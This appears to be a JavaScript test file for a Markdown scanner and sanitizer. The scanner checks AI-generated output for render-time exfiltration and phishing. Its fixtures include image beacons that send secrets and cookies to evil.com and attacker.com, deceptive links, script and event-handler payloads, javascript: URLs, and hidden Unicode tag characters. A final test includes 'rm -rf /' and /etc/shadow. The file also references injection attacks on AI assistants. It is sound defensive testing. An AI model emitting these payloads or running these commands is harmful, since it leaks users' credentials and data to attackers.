import { test } from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { Context } from 'cordis'
import * as plugin from '../lib/index.js'

const {
  scanMarkdown, sanitizeMarkdown, scanAndJudge, renderVerdictOf,
  segmentMarkdown, parseUrl, decodeEntities, developRenderTags,
} = plugin

/** 把明文编码成 Unicode Tags 区隐形字符（测试构造器） */
const tagEncode = (s) => Array.from(s)
  .map((ch) => String.fromCodePoint(ch.charCodeAt(0) + 0xE0000))
  .join('')
const RLO = String.fromCodePoint(0x202E)
const ZWSP = String.fromCodePoint(0x200B)

function makeCtx(config) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-guardian-render-'))
  const root = new Context()
  root.plugin(plugin, { logFile: path.join(dir, 'audit.log'), ...config })
  return { ctx: root, logFile: path.join(dir, 'audit.log') }
}
const wait = () => new Promise(r => setTimeout(r, 200))

const has = (findings, id, sev) => findings.some((f) => f.ruleId === id && (!sev || f.severity === sev))

// ── 纯函数：分段与解码 ────────────────────────────────
test('segmentMarkdown：围栏代码块与行内代码被豁免', () => {
  const md = '前文\n```js\n![beacon](https://evil.com?d=AAAA)\n```\n后文 `![inline](https://evil.com?d=BBBB)` 尾'
  const segs = segmentMarkdown(md)
  const joined = segs.map((s) => s.text).join('')
  assert.equal(joined, md)   // 无损
  const codeText = segs.filter((s) => s.code).map((s) => s.text).join('')
  assert.ok(codeText.includes('evil.com?d=AAAA'))
  assert.ok(codeText.includes('evil.com?d=BBBB'))
  const plainText = segs.filter((s) => !s.code).map((s) => s.text).join('')
  assert.ok(!plainText.includes('evil.com'))
})

test('decodeEntities / parseUrl：实体编码的协议与路径解析', () => {
  assert.equal(decodeEntities('javascript&#58;alert(1)'), 'javascript:alert(1)')
  assert.equal(decodeEntities('&#106;avascript&colon;x'), 'javascript:x')
  assert.equal(decodeEntities('&#x6a;avascript:x'), 'javascript:x')
  const u = parseUrl('https://Example.COM:8443/a?d=hello#frag')
  assert.equal(u.scheme, 'https')
  assert.equal(u.host, 'example.com')
  assert.equal(u.query, 'd=hello')
  assert.equal(u.fragment, 'frag')
})

test('developRenderTags：Tags 区显影（渲染层审计）', () => {
  assert.equal(developRenderTags(tagEncode('leak')), 'leak')
})

// ── MDX-001 图片信标 ─────────────────────────────────
test('MDX-001：Theia PoC 形态（模板插值占位符）命中 poison', () => {
  const md = '## 架构图\n![diagram](https://evil-cdn.com/diagram.png?d=${process.env.AWS_SECRET_ACCESS_KEY})\n'
  const findings = scanMarkdown(md)
  assert.ok(has(findings, 'MDX-001', 'poison'), JSON.stringify(findings))
  assert.equal(scanAndJudge(md).safe, false)
})

test('MDX-001：Claude PoC 形态（[DATA] 占位符 webhook）命中 poison', () => {
  const md = 'Here is the summary: ![summary](https://user-server.webhook.site/?data=[DATA])'
  assert.ok(has(scanMarkdown(md), 'MDX-001', 'poison'))
})

test('MDX-001：base64 高熵载荷命中 poison', () => {
  const md = '![pixel](https://attacker.com/px.gif?d=aGVsbG8gc2VjcmV0IHBheWxvYWQ=)'
  assert.ok(has(scanMarkdown(md), 'MDX-001', 'poison'))
})

test('MDX-001：query 中藏真实密钥命中 poison（复用 gitleaks 规则）', () => {
  const md = `![logo](https://evil.com/l.png?x=AKIAIOSFODNN7EXAMPLE)`
  assert.ok(has(scanMarkdown(md), 'MDX-001', 'poison'))
})

test('MDX-001：百分号二次编码的占位符命中 poison', () => {
  const md = '![a](https://evil.com/p?d=%24%7Bsecret%7D)'
  const findings = scanMarkdown(md)
  assert.ok(has(findings, 'MDX-001', 'poison'), JSON.stringify(findings))
})

test('MDX-001：HTML img 信标（Checkmarx Copilot/Gemini 形态）命中 poison', () => {
  const md = '<img src="https://attacker.com/pixel.gif?c=SGVsbG8gV29ybGQgU2VjcmV0" />'
  assert.ok(has(scanMarkdown(md), 'MDX-001', 'poison'))
})

test('MDX-001：引用式定义藏信标目标命中 poison', () => {
  const md = 'Click:\n\n![chart][1]\n\n[1]: https://evil.com/c.png?payload=c2VjcmV0X2RhdGE='
  const findings = scanMarkdown(md)
  assert.ok(has(findings, 'MDX-001', 'poison'), JSON.stringify(findings))
  assert.ok(findings.some((f) => f.where.startsWith('definition:')))
})

test('MDX-001：良性图片（无 query）不命中', () => {
  for (const md of [
    '![logo](https://example.com/logo.png)',
    '![badge](https://img.shields.io/badge/test-pass-brightgreen)',
    '<img src="https://example.com/a.png" width="10">',
    '相对路径 ![alt](./images/local.png) 与 ![x](/static/x.svg)',
  ]) {
    assert.deepEqual(scanMarkdown(md), [], `不应命中: ${md}`)
  }
})

test('MDX-001：图片 URL 带普通 query → suspect；trustedImageHosts 白名单豁免', () => {
  const md = '![avatar](https://github.com/u.png?v=4&s=60)'
  assert.ok(has(scanMarkdown(md), 'MDX-001', 'suspect'))
  assert.equal(scanAndJudge(md).safe, true)
  assert.equal(scanAndJudge(md).requiresReview, true)
  // 配置可信域名后豁免
  const clean = scanMarkdown(md, { trustedImageHosts: ['github.com'] })
  assert.ok(!has(clean, 'MDX-001'), JSON.stringify(clean))
  // 子域名后缀匹配
  assert.ok(!has(scanMarkdown('![a](https://avatars.github.com/u.png?v=4)', { trustedImageHosts: ['github.com'] }), 'MDX-001'))
})

// ── MDX-002 链接显示欺骗 ─────────────────────────────
test('MDX-002：显示文本伪装成别的 URL 命中 poison', () => {
  for (const md of [
    '请访问 [https://apple.com/id/verify](https://evil.io/phish) 更新账户',
    '付款到 [www.paypal.com](https://paypa1-evil.com/x)',
  ]) {
    assert.ok(has(scanMarkdown(md), 'MDX-002', 'poison'), `应命中: ${md}`)
  }
})

test('MDX-002：显示与目标同 host 不命中（含路径差异）', () => {
  for (const md of [
    '[https://apple.com/pricing](https://apple.com/shop)',
    '[docs](https://nodejs.org/api/fs.html)',
    '版本 [v1.2](https://github.com/x/y/releases/tag/v1.2) 发布',   // 版本号 display 不是域名
  ]) {
    assert.ok(!has(scanMarkdown(md), 'MDX-002'), `不应命中: ${md}`)
  }
})

test('MDX-002：裸域名 display 不一致 → suspect（降级防误伤）', () => {
  const md = '[node.js 官网](https://nodejs.org/)'
  const findings = scanMarkdown(md)
  assert.ok(!findings.some((f) => f.ruleId === 'MDX-002' && f.severity === 'poison'))
})

test('MDX-002：裸 IP / punycode 目标 + 域名式 display 命中 poison', () => {
  assert.ok(has(scanMarkdown('[https-login.example.com](https://192.0.2.7/login)'), 'MDX-002', 'poison'))
  assert.ok(has(scanMarkdown('[apple.com](https://xn--80ak6aa92e.com/)'), 'MDX-002', 'poison'))
})

test('MDX-002：HTML <a> 显示欺骗同样命中', () => {
  const md = '<a href="https://evil.io/x">https://apple.com/verify</a>'
  assert.ok(has(scanMarkdown(md), 'MDX-002', 'poison'))
})

// ── MDX-003 危险 HTML ────────────────────────────────
test('MDX-003：script/iframe/meta refresh/事件属性命中 poison', () => {
  for (const md of [
    '<script>fetch("https://evil.com?d="+document.cookie)</script>',
    '<iframe src="https://evil.com/frame"></iframe>',
    '<meta http-equiv="refresh" content="0;url=https://evil.com">',
    '<img src="x.png" onerror="fetch(\'https://evil.com?d=1\')">',
    '<svg onload="alert(1)"></svg>',
    '<link rel="stylesheet" href="https://evil.com/s?d=aGVsbG8gc2VjcmV0">',
  ]) {
    assert.ok(has(scanMarkdown(md), 'MDX-003', 'poison'), `应命中: ${md.slice(0, 40)}`)
  }
})

test('MDX-003：良性 HTML 标签不命中', () => {
  for (const md of ['<b>加粗</b>', '<em>强调</em>', '<br>', '<td>单元格</td>']) {
    assert.ok(!has(scanMarkdown(md), 'MDX-003'), `不应命中: ${md}`)
  }
})

// ── MDX-004 危险协议 ─────────────────────────────────
test('MDX-004：javascript:/data:text/html 命中 poison（含实体编码绕过）', () => {
  for (const md of [
    '[点这里](javascript:alert(1))',
    '[点这里](javascript&#58;alert(1))',
    '[doc](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
    '![x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj4=)',
    '<a href="jAvAsCrIpT:alert(1)">x</a>',
  ]) {
    assert.ok(has(scanMarkdown(md), 'MDX-004', 'poison'), `应命中: ${md.slice(0, 40)}`)
  }
})

test('MDX-004：data:image 位图 → suspect 不拦截', () => {
  const md = '![icon](data:image/png;base64,iVBORw0KGgo=)'
  const findings = scanMarkdown(md)
  assert.ok(has(findings, 'MDX-004', 'suspect'))
  assert.equal(scanAndJudge(md).safe, true)
})

// ── MDX-005 隐形字符 ─────────────────────────────────
test('MDX-005：RLO/Tags 区命中 poison，零宽 suspect', () => {
  assert.ok(has(scanMarkdown(`点击 ${RLO} 赢取奖品`), 'MDX-005', 'poison'))
  assert.ok(has(scanMarkdown(`图 ${tagEncode('hidden')} 片`), 'MDX-005', 'poison'))
  const zw = scanMarkdown(`a${ZWSP}b`)
  assert.ok(has(zw, 'MDX-005', 'suspect'))
})

test('MDX-005：审计片段显影（excerpt 含明文）', () => {
  const f = scanMarkdown(`x ${tagEncode('secretleak')} y`).find((x) => x.ruleId === 'MDX-005')
  assert.ok(f && f.excerpt.includes('secretleak'))
})

// ── 代码块豁免（精度关键特性）────────────────────────
test('代码块里的攻击 payload 不误报（Agent 合法讲解攻击面）', () => {
  const md = [
    '攻击者会这样构造信标：',
    '',
    '```markdown',
    '![img](https://evil.com/pixel?d=SGVjcmV0RGF0YQ==)',
    '```',
    '',
    '或 `[click](javascript:alert(1))`。请勿渲染此类输出。',
  ].join('\n')
  assert.deepEqual(scanMarkdown(md), [])
})

// ── sanitize ─────────────────────────────────────────
test('sanitize：信标图片移除、良性图片保留', () => {
  const md = '头 ![logo](https://example.com/l.png) 中 ![px](https://evil.com/p.gif?d=aGVsbG8gc2VjcmV0) 尾'
  const out = sanitizeMarkdown(md)
  assert.ok(out.includes('![logo](https://example.com/l.png)'))
  assert.ok(!out.includes('evil.com'))
  assert.ok(out.includes('[图片已移除：px]'))
})

test('sanitize：欺骗链接显真（用户所见即所去）、良性链接原样', () => {
  const md = '去 [https://apple.com/v](https://evil.io/x) 或 [文档](https://example.com/docs) 看看'
  const out = sanitizeMarkdown(md)
  assert.ok(out.includes('https://evil.io/x') && /真实目标/.test(out), out)
  assert.ok(!/\[https:\/\/apple\.com\/v\]\(https:\/\/evil\.io\/x\)/.test(out))
  assert.ok(out.includes('[文档](https://example.com/docs)'))
})

test('sanitize：危险协议链接移除、危险标签/事件属性剥除', () => {
  const out1 = sanitizeMarkdown('[x](javascript:alert(1))')
  assert.ok(out1.includes('链接已移除') && !out1.includes('javascript'))
  const out2 = sanitizeMarkdown('<script>evil()</script>剩余 <b>ok</b> <img src="a.png" onerror="x()">')
  assert.ok(!out2.includes('script'))
  assert.ok(out2.includes('剩余'))
  assert.ok(out2.includes('<b>ok</b>'))
  assert.ok(!out2.includes('onerror'))
})

test('sanitize：隐形字符剥除、代码块原样保留', () => {
  const md = `a${RLO}b\ncode:\n\`\`\`\n![p](https://evil.com?d=aGVsbG8gc2VjcmV0)\n\`\`\`\nend`
  const out = sanitizeMarkdown(md)
  assert.ok(!out.includes(RLO))
  assert.ok(out.includes('![p](https://evil.com?d=aGVsbG8gc2VjcmV0)'))
})

test('sanitize：成对危险标签带内容整体剥除', () => {
  const out = sanitizeMarkdown('前 <iframe src="https://x.com">inner</iframe> 后')
  assert.ok(!out.toLowerCase().includes('iframe'))
  assert.ok(out.includes('前') && out.includes('后'))
})

// ── verdict ──────────────────────────────────────────
test('scanAndJudge：poison → safe=false 且给出 sanitized 替代', () => {
  const md = '# 报告\n![px](https://evil.com/p.gif?data=aGVsbG8gc2VjcmV0X2RhdGE=)\n结论：正常'
  const v = scanAndJudge(md)
  assert.equal(v.safe, false)
  assert.equal(v.requiresReview, false)
  assert.ok(v.sanitized.includes('# 报告'))
  assert.ok(!v.sanitized.includes('evil.com'))
  assert.ok(v.sanitized.includes('结论：正常'))
  // 净化版再扫 → 干净
  assert.deepEqual(scanMarkdown(v.sanitized), [])
})

test('scanAndJudge：suspect-only → safe=true + requiresReview=true', () => {
  const v = scanAndJudge('![a](https://example.com/a.png?w=100)')
  assert.equal(v.safe, true)
  assert.equal(v.requiresReview, true)
  assert.equal(v.sanitized, '![a](https://example.com/a.png?w=100)')
})

test('renderVerdictOf：良性输出零命中', () => {
  const md = '# 标题\n\n正文 [链接](https://example.com/a) 与 ![图](https://example.com/b.png)。\n\n- 列表\n- `code`\n'
  const v = renderVerdictOf(md, scanMarkdown(md))
  assert.equal(v.safe, true)
  assert.equal(v.requiresReview, false)
  assert.equal(v.sanitized, md)
})

test('空输入与无 URL 输出的边界', () => {
  assert.deepEqual(scanMarkdown(''), [])
  assert.deepEqual(scanMarkdown('纯文本，没有链接和图片'), [])
  assert.equal(scanAndJudge('').safe, true)
})

// ── Cordis 集成：guardian/render 事件通道 ────────────
test('guardian/render 事件通道：poison 拦截 + 审计 deny', async () => {
  const { ctx, logFile } = makeCtx(); await wait()
  const v = ctx.bail('guardian/render', '看图 ![px](https://evil.com/p.gif?d=aGVsbG8gc2VjcmV0)')
  assert.equal(v.safe, false)
  assert.ok(v.sanitized.includes('图片已移除'))
  await wait()
  const entries = JSON.parse(fs.readFileSync(logFile, 'utf8').trim().split('\n')[0])
  assert.equal(entries.engine, 'render')
  assert.equal(entries.level, 'deny')
  assert.equal(entries.ruleId, 'MDX-001')
})

test('guardian/render 事件通道：suspect 告警 + 审计 allow', async () => {
  const { ctx, logFile } = makeCtx(); await wait()
  const v = ctx.bail('guardian/render', '![a](https://example.com/a.png?w=100)')
  assert.equal(v.safe, true)
  assert.equal(v.requiresReview, true)
  await wait()
  const entries = fs.readFileSync(logFile, 'utf8').trim().split('\n').map((l) => JSON.parse(l))
  assert.ok(entries.some((e) => e.engine === 'render' && e.level === 'allow'))
})

test('guardian/render：scanRender=false 直接放行', async () => {
  const { ctx } = makeCtx({ scanRender: false }); await wait()
  const md = '![px](https://evil.com/p.gif?d=aGVsbG8gc2VjcmV0)'
  const v = ctx.bail('guardian/render', md)
  assert.equal(v.safe, true)
  assert.equal(v.sanitized, md)
})

test('guardian/render：配置级 trustedImageHosts 生效', async () => {
  const { ctx } = makeCtx({ trustedImageHosts: ['cdn.mine.dev'] }); await wait()
  const v = ctx.bail('guardian/render', '![c](https://cdn.mine.dev/x.png?w=200)')
  assert.deepEqual(v.findings, [])
})

test('guardian/render：与其他通道互不干扰（check/path 照常）', async () => {
  const { ctx } = makeCtx(); await wait()
  const v = ctx.bail('guardian/render', '安全输出')
  assert.equal(v.safe, true)   // bail 总返回 verdict 对象
  assert.ok(ctx.bail('guardian/check', 'bash', 'rm -rf /'))
  const pv = ctx.bail('guardian/path', '/etc/shadow')
  assert.equal(pv.safe, false)
})
